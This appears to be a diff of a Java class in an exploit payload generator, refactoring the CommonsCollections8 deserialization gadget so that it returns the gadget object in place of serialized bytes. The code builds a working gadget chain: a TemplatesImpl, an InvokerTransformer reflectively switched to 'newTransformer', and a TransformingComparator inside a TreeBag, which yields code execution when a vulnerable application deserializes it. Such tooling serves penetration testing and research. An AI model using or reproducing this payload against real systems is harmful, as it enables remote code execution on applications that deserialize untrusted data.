@@ -15,25 +15,13 @@ import java.util.Comparator;
 public class CommonsCollections8 implements ObjectPayload<TreeBag>{
 
 
-    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public TreeBag getObject(PayloadType type, String... param) throws Exception {
         final Object           tpl         = Gadgets.createTemplatesImpl(type, param);
         InvokerTransformer     transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
         TransformingComparator comp        = new TransformingComparator((Transformer) transformer);
         TreeBag                tree        = new TreeBag((Comparator) comp);
         tree.add(tpl);
         Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
-
-        ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
-        oos.writeObject(tree);
-        byte[] bytes = baous.toByteArray();
-        oos.close();
-
-        return bytes;
-    }
-
-    @Override
-    public TreeBag getObject(String command) throws Exception {
-        return null;
+        return tree;
     }
 }
